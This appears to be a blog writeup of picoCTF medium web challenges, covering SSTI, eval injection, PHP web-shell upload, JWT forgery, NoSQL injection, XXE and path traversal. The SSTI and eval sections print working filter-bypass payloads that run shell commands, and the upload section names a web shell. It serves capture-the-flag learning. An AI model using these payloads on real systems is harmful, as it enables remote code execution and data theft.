+++
date = '2025-08-09T17:07:19+08:00'
draft = false
title = 'PicoCTF Web Medium Writeup'
+++

# SSTI2

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website

http://shape-facility.picoctf.net:63568/

Website is vulnerable to SSTI
![a](4f353aa04b3d12bbc315a7900e2f82ec1cb08d1e.png)

Based on the server response header and templating evaluation, most probably a Python templating engine, Jinja2
![b](790e45b4b52ecadead56b655e917f5c68529db65.png)

A typical Jinja SSTI payload is `{{ ().class.base.subclasses() }}`

The app filters certain characters like `_`, we can bypass the filter by replacing `_` with `\x5f`. To make our payload more subversive, we can also change the way we get attribute of an object from `foo.bar` to `foo|attr("bar")`.

```python
{{()|attr('\x5f\x5fclass\x5f\x5f')}}

|attr('\x5f\x5f\x5f\x5f')

# list the subclasses avaliable
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
```

We can manually find the offset for os class or we can access the os class through the built python builtin functions. The example below utilise the request class to access python builtin functions.

```python
{{request.application.__globals__.
__builtins__.__import__('os').popen('id').read()}}
```

We can access the subclasses of each special methods in function as such `__globals__.__builtins__`. Since we are bypassing the filter, we can convert our payload from `__globals__.__builtins__` to `attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')`

The final payload

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

SSTI to get RCE
![c](bba8bc573237b0886ac577b4a77ac8053e0473cc.png)

Locate the flag and read it
![d](49f56ee14ba09e0c4e03001ff2f7c31334129361.png)

![e](acb87892225f893fe9ce19216cebda869058dcf5.png)

# 3v@l

ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?

![](1bd85db1970efa6120aa9ec21f77681f843e0228.png)

Server response suggests that it is a python application
![](a7a052a7c0dddf41c3237af378818f7820af78e0.png)

Payload `code=7*7` will show 49 in the HTML response. There seems to be some sort of evaluation of expressions. A possibility maybe through templating engine or functions like `eval()`.

![](ce9601cf2dfec1bb21d73762471b7efc810d7674.png)

`code=__import__('os').system('id')`

![](d3cce9327123ae3dbd1dd3ac1f2d7d7af160508c.png)

Since the user input is being evaluated, we can use chr(111)+chr(115) instead of the string `os`. Make sure to URL encode the `+` to `%2b`. You can get the unicode integer of a character using `chr('o')` -\> 111

![](95fe163414f731a61344e7ea15135a1c027a5739.png)

List directory, again we are faced with forbidden keyword `ls`.

![](3bf9785d913590dbbba495d3463dca32c83aa572.png)

```python
>>> ord('l')
108
>>> ord('s')
115
>>> ord(' ')
32
>>> ord('-')
45
>>> ord('a')
97
```

```python
code=__import('os').popen('ls -la').read()

code=__import__(chr(111)%2bchr(115)).popen(chr(108)%2bchr(115)%2bchr(32)%2bchr(45)%2bchr(108)%2bchr(97)).read()
```

![](e719e8e9f3ddc42f19d44a0ac1b86025daf865d1.png)

The flag is in /flag.txt

```python
code=__import('os').popen('ls -la /').read()

code=__import__(chr(111)%2bchr(115)).popen(chr(108)%2bchr(115)%2bchr(32)%2bchr(45)%2bchr(108)%2bchr(97)%2bchr(32)%2bchr(47)).read()
```

![](4a8af4b8f62892133b9be92d720ae9939afb9ba2.png)

Read the flag

```python
code=__import('os').popen('cat /flag.txt').read()

99 97 116 32 47 102 108 97 103 46 116 120 116

code=__import__(chr(111)%2bchr(115)).popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(46)%2bchr(116)%2bchr(120)%2bchr(116)).read()
```

![](752e089bf9ee5b1e0c6d2c4ef59fcb95098bd891.png)

Another way to build the string via chr is using join method and lambda function

```python
''.join([chr(x) for x in [47, 102, 108, 97, 103, 46, 116, 120, 116]]).read()
```

# Trickster

I found a web app that can help process images: PNG images only!

There is a server side check for PNG magic bytes, `.png` in the filename. The form-data Content-Type is not checked

![](6228fb2ab0e9651962a04999bf929b91aebccaf1.png)

Note that the Response header shows Apache, Debian and PHP.

http://atlas.picoctf.net:51620/robots.txt

![](8b2e21cfa499b5b0755d725ab647e03886bdb770.png)

http://atlas.picoctf.net:51620/instructions.txt

![](8bdea46da51c23392516c2c3c5a7b9ee004f10be.png)

Upload our simple PHP web shell

![](b65f1e054d90daf95400729222547e6947dbb9f5.png)

http://atlas.picoctf.net:51620/uploads/shell.png.php?cmd=id

![](f8b87836e8ee397cf1281c0aef8063a5235b212a.png)

Snoop around the system to get the flag

![](575f6a3dd381e26ed7772bfc23c7ef52626f3031.png)

# Java Code Analysis

BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:

- user:user

The source code is also provided.

After login, user session is via JWT

```json
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlacZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1ODI3MTA5MCwiaWF0IjoxNzU3NjY2MjkwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.dE5z711e4aTUJjEORDffR9tHMNCkMTX3J4bHN_kURQI
```

![](2700ee1ec0b5b0149f80a4ead9ae116bf1ed232d.png)

The source code is provided. The JWT secret is obtained at line 26 of src/main/java/io/github/nandandesai/pico/security/JwtService.java

![](4b14ab13cfd2342c65b09615809b1e7ac73d5747.png)

Tracing the code src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java, there is a possibility that the secret used on the production server is 1234.

![](8d18addd9eed021cf6859174f9e59dec02338ae1.png)

We can forge the JWT token using the secret 1234. There are many ways of doing it, e.g. jwt.io, burp JWT Web token extension.

Forge the token to get the flag that is only accessible by admin. The src/main/java/io/github/nandandesai/pico/security/BookPdfAccessCheck.java shows that authorization verification checks the user role based on the userId.

![](a16fb235da8c869b0ea497c52064ca694862aa54.png)

The code at src/main/java/io/github/nandandesai/pico/controllers/UserController.java shows us an endpoint to query user information.

![](45773740696cf6d640b632e34126715638a7b72d.png)

Our low privileged user is able to access this endpoint. We can get the admin userId and other details.

![](af528dbb7421895ab15c3fb2ff44a702835e8af2.png)

Forge the token with the known secret 1234

![](65f5e8b8e4ad4f8497df9cda997e04353ee796df.png)

![](1dd18326238fe6d70c0df9a8c36cacbb49aaa300.png)

# No SQL Injection

Can you try to get access to this website to get the flag?
Source code is provided

Intercept a normal login request with invalid credentials

![](02619367480672dfa68fa5ae87c586254e34dc3c.png)

Attempt to perform simple operation injection but failed.

![](fc684b73f438fbf82f73c2f59d9e144ad7474e9d.png)

Inpsecting server.js implementation of POST /login shows JSON.parse() being used. Our nested object `{"$ne":"invalid"}` in the payload should be stringify instead.

![](f5518ee6bcf8805bb47b592c277b71b0a42f6c91.png)

![](5dc93f24e8eb423bebf8f2377d8461abe723931b.png)

The flag is base64 encoded in the the token of the response.

# findme

Help us test the form by submiting the username as test and password as test!

test:test!

![](7b1e41a82ae574cfbb6ca39f40864515e5122421.png)

redirected to:

![](807d8de00fdc891af5bbdb504eeac5d304f07e0d.png)

![](1455c9f0c1c49d1d9de2a06dc8a2d277f11a6143.png)

base64 decode

- cGljb0NURntwcm94aWVzX2Fs -\> picoCTF{proxies_al
- bF90aGVfd2F5X2QxYzBiMTEyfQ== -\> l_the_way_d1c0b112}"

picoCTF{proxies_all_the_way_d1c0b112}

# SOAP

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

The website has a feature where we can query information via a POST request and xml data

![](e3fc672a0aa356dcf747df1affc74e7478c50259.png)

Very straight forward challenge. Simply create a DOCTYPE element that defines an external entity containing the target file /etc/passwd. Then reference the external entity variable in the xml payload for the XML service to process it.

![](057d1b988cb4fe23cfe3367f15786aac13211e2c.png)

# More SQLi

Can you find the flag on this website.

The response reveals the SQL query

![](542ba2e4f4a3ace968d30eff29c27d32bb15e262.png)

![](67e1512608f89d3a34646a5ceefd3d115003bcf9.png)

# MatchTheRegex

How about trying to match a regular expression

![](c40bf3f0a36a2e8c3a63481c93ac3286e9bc25f2.png)

Inspect the DOM or HTML source and we see the logic of how the request is checked

![](f0493739100936cd7dc123dce079e8d0c5933015.png)

![](076e8ce99dfb2deaacd531ec209a61d9ec351499.png)

# Power Cookie

Can you get the flag?

Change the cookie value in the following request from isAdmin=0 to isAdmin=1

![](9c972a90123d6af395af2b88dbdb37a003f24183.png)

# Forbidden Paths

Can you get the flag? We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?

Path traversal in file read feature

![](a912b3f53f54f844de73932a71026ed242209715.png)

# JAuth

Most web application developers use third party components without testing their security. Some of the past affected companies are:

- Equifax (a US credit bureau organization) - breach due to unpatched Apache
- Struts web framework CVE-2017-5638
- Mossack Fonesca (Panama Papers law firm) breach - unpatched version o
- Drupal CMS used
- VerticalScope (internet media company) - outdated version of vBulletin forum software used

Can you identify the components and exploit the vulnerable one?
Can you become admin?

Credentials:
test:Test123!

![](984a6c5c683d130c7bf3f1edf32ab2e5ff9c50f4.png)

![](894099b670966747f24766b8138e9a83b972b705.png)

The JWT token set is vulnerable to header attack. We can modify the header to specify "alg":"none". The server handling the token will accept none algorithm and not validate the signature.

Change the role from user to admin.

![](99cb59db1f05751e577ac6e87fc5ad537a8af0a3.png)
